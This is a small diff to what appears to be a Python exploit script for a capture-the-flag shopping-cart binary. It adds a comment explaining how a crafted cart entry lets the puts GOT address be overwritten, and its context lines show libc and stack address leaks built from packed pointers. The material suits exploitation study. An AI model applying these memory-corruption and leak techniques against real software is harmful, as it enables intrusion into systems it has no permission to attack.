@@ -47,7 +47,7 @@ for i in range(20):
 checkout('y')
 #leak libc
 puts_got = 0x804b028
-
+# when the total = 7174, it save the pointer of the ip 8 on stack, so we can overwrite by putsgot
 cart('yb'+p32(puts_got)+p32(0xffffffff)+p32(0x0))
 s.recvuntil('27: ')
 
@@ -65,6 +65,7 @@ mycart = 0x804b068
 
 for i in range(26):
 	delete('1')
+
 #leak stack
 cart('yb'+p32(mycart+8)+p32(0x123)+p32(0x0))
 s.recvuntil('1: ')
